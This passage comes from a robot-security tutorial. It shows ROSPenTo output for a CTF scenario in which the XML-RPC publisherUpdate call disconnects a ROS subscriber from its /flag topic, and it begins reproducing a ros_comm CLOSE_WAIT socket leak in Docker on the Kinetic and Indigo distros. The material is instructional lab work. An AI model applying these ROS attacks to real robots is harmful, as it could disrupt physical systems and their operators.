    <span id="cb277-24"><a href="#cb277-24" aria-hidden="true" tabindex="-1"></a><span class="ex">Please</span> input URI of ROS Master: <span class="er">(</span><span class="ex">e.g.</span> http://localhost:11311/<span class="kw">)</span></span>
    <span id="cb277-25"><a href="#cb277-25" aria-hidden="true" tabindex="-1"></a> <span class="ex">http://localhost:11311/</span></span>
    <span id="cb277-26"><a href="#cb277-26" aria-hidden="true" tabindex="-1"></a><span class="ex">URI</span> <span class="st">&#39; http://localhost:11311/&#39;</span> is not valid!</span>
    <span id="cb277-27"><a href="#cb277-27" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb277-28"><a href="#cb277-28" aria-hidden="true" tabindex="-1"></a><span class="ex">Please</span> input URI of ROS Master: <span class="er">(</span><span class="ex">e.g.</span> http://localhost:11311/<span class="kw">)</span></span>
    <span id="cb277-29"><a href="#cb277-29" aria-hidden="true" tabindex="-1"></a><span class="ex">http://localhost:11311/</span></span>
    <span id="cb277-30"><a href="#cb277-30" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb277-31"><a href="#cb277-31" aria-hidden="true" tabindex="-1"></a><span class="ex">System</span> 0: http://127.0.0.1:11311/</span>
    <span id="cb277-32"><a href="#cb277-32" aria-hidden="true" tabindex="-1"></a><span class="ex">Nodes:</span></span>
    <span id="cb277-33"><a href="#cb277-33" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Node</span> 0.1: /listener <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:41723/<span class="kw">)</span></span>
    <span id="cb277-34"><a href="#cb277-34" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Node</span> 0.0: /publisher <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:36517/<span class="kw">)</span></span>
    <span id="cb277-35"><a href="#cb277-35" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Node</span> 0.2: /rosout <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:35635/<span class="kw">)</span></span>
    <span id="cb277-36"><a href="#cb277-36" aria-hidden="true" tabindex="-1"></a><span class="ex">Topics:</span></span>
    <span id="cb277-37"><a href="#cb277-37" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Topic</span> 0.0: /flag <span class="er">(</span><span class="ex">Type:</span> std_msgs/String<span class="kw">)</span></span>
    <span id="cb277-38"><a href="#cb277-38" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Topic</span> 0.1: /rosout <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb277-39"><a href="#cb277-39" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Topic</span> 0.2: /rosout_agg <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb277-40"><a href="#cb277-40" aria-hidden="true" tabindex="-1"></a><span class="ex">Services:</span></span>
    <span id="cb277-41"><a href="#cb277-41" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.3: /listener/get_loggers</span>
    <span id="cb277-42"><a href="#cb277-42" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.2: /listener/set_logger_level</span>
    <span id="cb277-43"><a href="#cb277-43" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.1: /publisher/get_loggers</span>
    <span id="cb277-44"><a href="#cb277-44" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.0: /publisher/set_logger_level</span>
    <span id="cb277-45"><a href="#cb277-45" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.4: /rosout/get_loggers</span>
    <span id="cb277-46"><a href="#cb277-46" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.5: /rosout/set_logger_level</span>
    <span id="cb277-47"><a href="#cb277-47" aria-hidden="true" tabindex="-1"></a><span class="ex">Communications:</span></span>
    <span id="cb277-48"><a href="#cb277-48" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Communication</span> 0.0:</span>
    <span id="cb277-49"><a href="#cb277-49" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Publishers:</span></span>
    <span id="cb277-50"><a href="#cb277-50" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.0: /publisher <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:36517/<span class="kw">)</span></span>
    <span id="cb277-51"><a href="#cb277-51" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Topic</span> 0.0: /flag <span class="er">(</span><span class="ex">Type:</span> std_msgs/String<span class="kw">)</span></span>
    <span id="cb277-52"><a href="#cb277-52" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Subscribers:</span></span>
    <span id="cb277-53"><a href="#cb277-53" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.1: /listener <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:41723/<span class="kw">)</span></span>
    <span id="cb277-54"><a href="#cb277-54" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Communication</span> 0.1:</span>
    <span id="cb277-55"><a href="#cb277-55" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Publishers:</span></span>
    <span id="cb277-56"><a href="#cb277-56" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.0: /publisher <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:36517/<span class="kw">)</span></span>
    <span id="cb277-57"><a href="#cb277-57" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.1: /listener <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:41723/<span class="kw">)</span></span>
    <span id="cb277-58"><a href="#cb277-58" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Topic</span> 0.1: /rosout <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb277-59"><a href="#cb277-59" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Subscribers:</span></span>
    <span id="cb277-60"><a href="#cb277-60" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.2: /rosout <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:35635/<span class="kw">)</span></span>
    <span id="cb277-61"><a href="#cb277-61" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Communication</span> 0.2:</span>
    <span id="cb277-62"><a href="#cb277-62" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Publishers:</span></span>
    <span id="cb277-63"><a href="#cb277-63" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.2: /rosout <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:35635/<span class="kw">)</span></span>
    <span id="cb277-64"><a href="#cb277-64" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Topic</span> 0.2: /rosout_agg <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb277-65"><a href="#cb277-65" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Subscribers:</span></span>
    <span id="cb277-66"><a href="#cb277-66" aria-hidden="true" tabindex="-1"></a><span class="ex">Parameters:</span></span>
    <span id="cb277-67"><a href="#cb277-67" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Parameter</span> 0.0:</span>
    <span id="cb277-68"><a href="#cb277-68" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Name:</span> /roslaunch/uris/host_19246d9bf44b__37253</span>
    <span id="cb277-69"><a href="#cb277-69" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Parameter</span> 0.1:</span>
    <span id="cb277-70"><a href="#cb277-70" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Name:</span> /rosdistro</span>
    <span id="cb277-71"><a href="#cb277-71" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Parameter</span> 0.2:</span>
    <span id="cb277-72"><a href="#cb277-72" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Name:</span> /rosversion</span>
    <span id="cb277-73"><a href="#cb277-73" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Parameter</span> 0.3:</span>
    <span id="cb277-74"><a href="#cb277-74" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Name:</span> /run_id</span>
    <span id="cb277-75"><a href="#cb277-75" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb277-76"><a href="#cb277-76" aria-hidden="true" tabindex="-1"></a><span class="ex">What</span> do you want to do<span class="pp">?</span></span>
    <span id="cb277-77"><a href="#cb277-77" aria-hidden="true" tabindex="-1"></a><span class="ex">0:</span> Exit</span>
    <span id="cb277-78"><a href="#cb277-78" aria-hidden="true" tabindex="-1"></a><span class="ex">1:</span> Analyse system...</span>
    <span id="cb277-79"><a href="#cb277-79" aria-hidden="true" tabindex="-1"></a><span class="ex">2:</span> Print all analyzed systems</span>
    <span id="cb277-80"><a href="#cb277-80" aria-hidden="true" tabindex="-1"></a><span class="ex">3:</span> Print information about analyzed system...</span>
    <span id="cb277-81"><a href="#cb277-81" aria-hidden="true" tabindex="-1"></a><span class="ex">4:</span> Print nodes of analyzed system...</span>
    <span id="cb277-82"><a href="#cb277-82" aria-hidden="true" tabindex="-1"></a><span class="ex">5:</span> Print node types of analyzed system <span class="er">(</span><span class="ex">Python</span> or C++<span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-83"><a href="#cb277-83" aria-hidden="true" tabindex="-1"></a><span class="ex">6:</span> Print topics of analyzed system...</span>
    <span id="cb277-84"><a href="#cb277-84" aria-hidden="true" tabindex="-1"></a><span class="ex">7:</span> Print services of analyzed system...</span>
    <span id="cb277-85"><a href="#cb277-85" aria-hidden="true" tabindex="-1"></a><span class="ex">8:</span> Print communications of analyzed system...</span>
    <span id="cb277-86"><a href="#cb277-86" aria-hidden="true" tabindex="-1"></a><span class="ex">9:</span> Print communications of topic...</span>
    <span id="cb277-87"><a href="#cb277-87" aria-hidden="true" tabindex="-1"></a><span class="ex">10:</span> Print parameters...</span>
    <span id="cb277-88"><a href="#cb277-88" aria-hidden="true" tabindex="-1"></a><span class="ex">11:</span> Update publishers list of subscriber <span class="er">(</span><span class="ex">add</span><span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-89"><a href="#cb277-89" aria-hidden="true" tabindex="-1"></a><span class="ex">12:</span> Update publishers list of subscriber <span class="er">(</span><span class="bu">set</span><span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-90"><a href="#cb277-90" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span> Update publishers list of subscriber <span class="er">(</span><span class="ex">remove</span><span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-91"><a href="#cb277-91" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span> Isolate service...</span>
    <span id="cb277-92"><a href="#cb277-92" aria-hidden="true" tabindex="-1"></a><span class="ex">15:</span> Unsubscribe node from parameter <span class="er">(</span><span class="ex">only</span> C++<span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-93"><a href="#cb277-93" aria-hidden="true" tabindex="-1"></a><span class="ex">16:</span> Update subscribed parameter at Node <span class="er">(</span><span class="ex">only</span> C++<span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-94"><a href="#cb277-94" aria-hidden="true" tabindex="-1"></a><span class="ex">8</span></span>
    <span id="cb277-95"><a href="#cb277-95" aria-hidden="true" tabindex="-1"></a><span class="ex">Please</span> enter number of analysed system:</span>
    <span id="cb277-96"><a href="#cb277-96" aria-hidden="true" tabindex="-1"></a><span class="ex">0</span></span>
    <span id="cb277-97"><a href="#cb277-97" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb277-98"><a href="#cb277-98" aria-hidden="true" tabindex="-1"></a><span class="ex">System</span> 0: http://127.0.0.1:11311/</span>
    <span id="cb277-99"><a href="#cb277-99" aria-hidden="true" tabindex="-1"></a><span class="ex">Communications:</span></span>
    <span id="cb277-100"><a href="#cb277-100" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Communication</span> 0.0:</span>
    <span id="cb277-101"><a href="#cb277-101" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Publishers:</span></span>
    <span id="cb277-102"><a href="#cb277-102" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.0: /publisher <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:36517/<span class="kw">)</span></span>
    <span id="cb277-103"><a href="#cb277-103" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Topic</span> 0.0: /flag <span class="er">(</span><span class="ex">Type:</span> std_msgs/String<span class="kw">)</span></span>
    <span id="cb277-104"><a href="#cb277-104" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Subscribers:</span></span>
    <span id="cb277-105"><a href="#cb277-105" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.1: /listener <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:41723/<span class="kw">)</span></span>
    <span id="cb277-106"><a href="#cb277-106" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Communication</span> 0.1:</span>
    <span id="cb277-107"><a href="#cb277-107" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Publishers:</span></span>
    <span id="cb277-108"><a href="#cb277-108" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.0: /publisher <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:36517/<span class="kw">)</span></span>
    <span id="cb277-109"><a href="#cb277-109" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.1: /listener <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:41723/<span class="kw">)</span></span>
    <span id="cb277-110"><a href="#cb277-110" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Topic</span> 0.1: /rosout <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb277-111"><a href="#cb277-111" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Subscribers:</span></span>
    <span id="cb277-112"><a href="#cb277-112" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.2: /rosout <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:35635/<span class="kw">)</span></span>
    <span id="cb277-113"><a href="#cb277-113" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Communication</span> 0.2:</span>
    <span id="cb277-114"><a href="#cb277-114" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Publishers:</span></span>
    <span id="cb277-115"><a href="#cb277-115" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.2: /rosout <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:35635/<span class="kw">)</span></span>
    <span id="cb277-116"><a href="#cb277-116" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Topic</span> 0.2: /rosout_agg <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb277-117"><a href="#cb277-117" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Subscribers:</span></span></code></pre></div>
    <p>As it can be seen, there’re no changes (noticeable) in the communications when introspecting the ROS Master.</p>
    <p>What’s happening is that <code>ROSPenTo</code> called the XML-RPC function <code>publisherUpdate</code> with an empty list of publishers as parameter. This caused the <code>/listener</code> node to assume that no publishers are available for the <code>/flag</code> Topic and thus, it terminated the connection to the <code>/publisher</code> node.</p>
    <h3 id="resources-19">Resources</h3>
    <ul>
    <li>[1] Mendia, G. O., Juan, L. U. S., Bascaran, X. P., Calvo, A. B., Cordero, A. H., Ugarte, I. Z., … &amp; Vilches, V. M. (2018). Robotics CTF (RCTF), a playground for robot hacking. arXiv preprint arXiv:1810.02690.</li>
    <li>[2] Scenarios of the Robotics CTF (RCTF), a playground to challenge robot security. Retrieved from https://github.com/aliasrobotics/RCTF</li>
    <li>[3] Dieber, B., Breiling, B., Taurer, S., Kacianka, S., Rass, S., &amp; Schartner, P. (2017). Security for the Robot Operating System. Robotics and Autonomous Systems, 98, 192-203.</li>
    <li>[4] SROS2 Tutorial, IROS 2018. Retrieved from https://ruffsl.github.io/IROS2018_SROS2_Tutorial/.</li>
    <li>[5] roschaos. Retrieved from https://github.com/ruffsl/roschaos.</li>
    <li>[6] ROSPenTo. Retrieved from https://github.com/jr-robotics/ROSPenTo.</li>
    </ul>
    <h2 id="sockets-left-open-and-in-close_wait-state-in-ros-jade-distro-and-before">Sockets left open and in CLOSE_WAIT state in ROS (<code>Jade</code> distro and before)</h2>
    <p>In this tutorial we’ll exploit the vulnerability. First reported in April 2015 at https://github.com/ros/ros_comm/issues/610, the underlying httplib in <code>ros_comm</code> implements things so that connections are only closed if you are sending the header “connection: close”. Although a client might close the connection, the socket remains in the `CLOSE_WAIT state [3, 4].</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb278"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb278-1"><a href="#cb278-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity13:latest .</span></code></pre></div>
    <p>and run with:</p>
    <div class="sourceCode" id="cb279"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb279-1"><a href="#cb279-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> basic_cybersecurity13:latest</span></code></pre></div>
    <hr />
    <h3 id="reproducing-the-flaw">Reproducing the flaw</h3>
    <h4 id="kinetic">Kinetic</h4>
    <p>Let’s start with <code>Kinetic</code> and attempt to reproduce it as reported at https://github.com/ros/ros_comm/issues/610#issuecomment-100301061:</p>
    <div class="sourceCode" id="cb280"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb280-1"><a href="#cb280-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-f</span> Dockerfile.kinetic <span class="at">-t</span> basic_cybersecurity13:latest . <span class="co"># build the kinetic Dockerfile</span></span>
    <span id="cb280-2"><a href="#cb280-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> basic_cybersecurity13:latest</span>
    <span id="cb280-3"><a href="#cb280-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root@4256f9eb9567:~#</span> roscore <span class="kw">&amp;</span></span>
    <span id="cb280-4"><a href="#cb280-4" aria-hidden="true" tabindex="-1"></a><span class="ex">root@4256f9eb9567:~#</span> roslaunch /opt/ros/kinetic/share/roscpp_tutorials/launch/talker_listener.launch</span>
    <span id="cb280-5"><a href="#cb280-5" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb280-6"><a href="#cb280-6" aria-hidden="true" tabindex="-1"></a><span class="ex">^C</span></span>
    <span id="cb280-7"><a href="#cb280-7" aria-hidden="true" tabindex="-1"></a><span class="ex">root@4256f9eb9567:~#</span> roslaunch /opt/ros/kinetic/share/roscpp_tutorials/launch/talker_listener.launch</span>
    <span id="cb280-8"><a href="#cb280-8" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb280-9"><a href="#cb280-9" aria-hidden="true" tabindex="-1"></a><span class="ex">^C</span></span></code></pre></div>
    <p>in another command line:</p>
    <div class="sourceCode" id="cb281"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb281-1"><a href="#cb281-1" aria-hidden="true" tabindex="-1"></a><span class="ex">watch</span> <span class="at">-n0</span> <span class="st">&quot;lsof | grep rosmaster | grep -c CLOSE_WAIT&quot;</span></span>
    <span id="cb281-2"><a href="#cb281-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Every</span> 0.1s: lsof <span class="kw">|</span> <span class="fu">grep</span> rosmaster <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-c</span> CLOSE_WAIT                       Fri Nov  2 12:34:36 2018</span>
    <span id="cb281-3"><a href="#cb281-3" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb281-4"><a href="#cb281-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0</span></span></code></pre></div>
    <p>at some point, while re-launching and re-stopping the launchfile, we’ll see:</p>
    <div class="sourceCode" id="cb282"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb282-1"><a href="#cb282-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Every</span> 0.1s: lsof <span class="kw">|</span> <span class="fu">grep</span> rosmaster <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-c</span> CLOSE_WAIT                       Fri Nov  2 12:37:29 2018</span>
    <span id="cb282-2"><a href="#cb282-2" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb282-3"><a href="#cb282-3" aria-hidden="true" tabindex="-1"></a><span class="ex">5</span></span></code></pre></div>
    <p>in those cases:</p>
    <div class="sourceCode" id="cb283"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb283-1"><a href="#cb283-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@5f6d4b210151:/#</span> netstat <span class="at">-aeltnp</span> <span class="kw">|</span> <span class="fu">grep</span> CLOSE_WAIT</span>
    <span id="cb283-2"><a href="#cb283-2" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        1      0 172.17.0.2:35586        172.17.0.2:34571        CLOSE_WAIT  0          196101      48/python</span>
    <span id="cb283-3"><a href="#cb283-3" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 172.17.0.2:45520        172.17.0.2:11311        CLOSE_WAIT  0          136921      61/rosout</span></code></pre></div>
    <p>but as soon as <code>root@4256f9eb9567:~# roslaunch /opt/ros/kinetic/share/roscpp_tutorials/launch/talker_listener.launch</code> is executed again, the number of file descriptors return to 0.</p>
    <p>There seems to be a small glitch in <code>Kinetic</code> distro but the FDs leakeage seems to be contained. <strong>No issues with Kinetic distro</strong>.</p>
    <h4 id="indigo">Indigo</h4>
    <div class="sourceCode" id="cb284"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb284-1"><a href="#cb284-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-f</span> Dockerfile.indigo <span class="at">-t</span> basic_cybersecurity13:latest . <span class="co"># build the indigo Dockerfile</span></span>
    <span id="cb284-2"><a href="#cb284-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> basic_cybersecurity13:latest</span>
    <span id="cb284-3"><a href="#cb284-3" aria-hidden="true" tabindex="-1"></a><span class="ex">roscore</span> <span class="kw">&amp;</span></span>
    <span id="cb284-4"><a href="#cb284-4" aria-hidden="true" tabindex="-1"></a><span class="ex">roslaunch</span> /opt/ros/indigo/share/roscpp_tutorials/launch/talker_listener.launch</span>
    <span id="cb284-5"><a href="#cb284-5" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> logging to /root/.ros/log/280ed2ea-de98-11e8-b9b0-0242ac110002/roslaunch-4256f9eb9567-1088.log</span>
    <span id="cb284-6"><a href="#cb284-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Checking</span> log directory for disk usage. This may take awhile.</span>
    <span id="cb284-7"><a href="#cb284-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Press</span> Ctrl-C to interrupt</span>
    <span id="cb284-8"><a href="#cb284-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Done</span> checking log file disk usage. Usage is <span class="op">&lt;</span>1GB.</span>
    <span id="cb284-9"><a href="#cb284-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb284-10"><a href="#cb284-10" aria-hidden="true" tabindex="-1"></a><span class="ex">started</span> roslaunch server http://4256f9eb9567:43961/</span>
    <span id="cb284-11"><a href="#cb284-11" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb284-12"><a href="#cb284-12" aria-hidden="true" tabindex="-1"></a><span class="ex">SUMMARY</span></span>
    <span id="cb284-13"><a href="#cb284-13" aria-hidden="true" tabindex="-1"></a><span class="ex">========</span></span>
    <span id="cb284-14"><a href="#cb284-14" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb284-15"><a href="#cb284-15" aria-hidden="true" tabindex="-1"></a><span class="ex">PARAMETERS</span></span>
    <span id="cb284-16"><a href="#cb284-16" aria-hidden="true" tabindex="-1"></a> <span class="ex">*</span> /rosdistro: indigo</span>
    <span id="cb284-17"><a href="#cb284-17" aria-hidden="true" tabindex="-1"></a> <span class="ex">*</span> /rosversion: 1.11.21</span>
    <span id="cb284-18"><a href="#cb284-18" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb284-19"><a href="#cb284-19" aria-hidden="true" tabindex="-1"></a><span class="ex">NODES</span></span>
    <span id="cb284-20"><a href="#cb284-20" aria-hidden="true" tabindex="-1"></a>  <span class="ex">/</span></span>
    <span id="cb284-21"><a href="#cb284-21" aria-hidden="true" tabindex="-1"></a>    <span class="ex">listener</span> <span class="er">(</span><span class="ex">roscpp_tutorials/listener</span><span class="kw">)</span></span>
    <span id="cb284-22"><a href="#cb284-22" aria-hidden="true" tabindex="-1"></a>    <span class="ex">talker</span> <span class="er">(</span><span class="ex">roscpp_tutorials/talker</span><span class="kw">)</span></span>
    <span id="cb284-23"><a href="#cb284-23" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb284-24"><a href="#cb284-24" aria-hidden="true" tabindex="-1"></a><span class="va">ROS_MASTER_URI</span><span class="op">=</span>http://localhost:11311</span>
    <span id="cb284-25"><a href="#cb284-25" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb284-26"><a href="#cb284-26" aria-hidden="true" tabindex="-1"></a><span class="ex">core</span> service [/rosout] found</span>
    <span id="cb284-27"><a href="#cb284-27" aria-hidden="true" tabindex="-1"></a><span class="va">process</span><span class="op">[</span>listener-1<span class="op">]</span><span class="ex">:</span> started with pid [1106]</span>
    <span id="cb284-28"><a href="#cb284-28" aria-hidden="true" tabindex="-1"></a><span class="va">process</span><span class="op">[</span>talker-2<span class="op">]</span><span class="ex">:</span> started with pid [1107]</span>
    <span id="cb284-29"><a href="#cb284-29" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> INFO] [1541160590.106715200]: hello <span class="er">world</span> <span class="ex">0</span></span>
    <span id="cb284-30"><a href="#cb284-30" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> INFO] [1541160590.207328800]: hello <span class="er">world</span> <span class="ex">1</span></span>
    <span id="cb284-31"><a href="#cb284-31" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb284-32"><a href="#cb284-32" aria-hidden="true" tabindex="-1"></a><span class="ex">^C</span></span></code></pre></div>
    <p>Repeat the following a few times:</p>
    <div class="sourceCode" id="cb285"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb285-1"><a href="#cb285-1" aria-hidden="true" tabindex="-1"></a><span class="ex">roslaunch</span> /opt/ros/indigo/share/roscpp_tutorials/launch/talker_listener.launch</span>
    <span id="cb285-2"><a href="#cb285-2" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> logging to /root/.ros/log/280ed2ea-de98-11e8-b9b0-0242ac110002/roslaunch-4256f9eb9567-1088.log</span>
    <span id="cb285-3"><a href="#cb285-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Checking</span> log directory for disk usage. This may take awhile.</span>
    <span id="cb285-4"><a href="#cb285-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Press</span> Ctrl-C to interrupt</span>
    <span id="cb285-5"><a href="#cb285-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Done</span> checking log file disk usage. Usage is <span class="op">&lt;</span>1GB.</span>
    <span id="cb285-6"><a href="#cb285-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb285-7"><a href="#cb285-7" aria-hidden="true" tabindex="-1"></a><span class="ex">started</span> roslaunch server http://4256f9eb9567:43961/</span>
    <span id="cb285-8"><a href="#cb285-8" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb285-9"><a href="#cb285-9" aria-hidden="true" tabindex="-1"></a><span class="ex">SUMMARY</span></span>
    <span id="cb285-10"><a href="#cb285-10" aria-hidden="true" tabindex="-1"></a><span class="ex">========</span></span>
    <span id="cb285-11"><a href="#cb285-11" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb285-12"><a href="#cb285-12" aria-hidden="true" tabindex="-1"></a><span class="ex">PARAMETERS</span></span>
    <span id="cb285-13"><a href="#cb285-13" aria-hidden="true" tabindex="-1"></a> <span class="ex">*</span> /rosdistro: indigo</span>
    <span id="cb285-14"><a href="#cb285-14" aria-hidden="true" tabindex="-1"></a> <span class="ex">*</span> /rosversion: 1.11.21</span>
    <span id="cb285-15"><a href="#cb285-15" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb285-16"><a href="#cb285-16" aria-hidden="true" tabindex="-1"></a><span class="ex">NODES</span></span>
    <span id="cb285-17"><a href="#cb285-17" aria-hidden="true" tabindex="-1"></a>  <span class="ex">/</span></span>
    <span id="cb285-18"><a href="#cb285-18" aria-hidden="true" tabindex="-1"></a>    <span class="ex">listener</span> <span class="er">(</span><span class="ex">roscpp_tutorials/listener</span><span class="kw">)</span></span>
    <span id="cb285-19"><a href="#cb285-19" aria-hidden="true" tabindex="-1"></a>    <span class="ex">talker</span> <span class="er">(</span><span class="ex">roscpp_tutorials/talker</span><span class="kw">)</span></span>
    <span id="cb285-20"><a href="#cb285-20" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb285-21"><a href="#cb285-21" aria-hidden="true" tabindex="-1"></a><span class="va">ROS_MASTER_URI</span><span class="op">=</span>http://localhost:11311</span>
    <span id="cb285-22"><a href="#cb285-22" aria-hidden="true" tabindex="-1"></a></span>
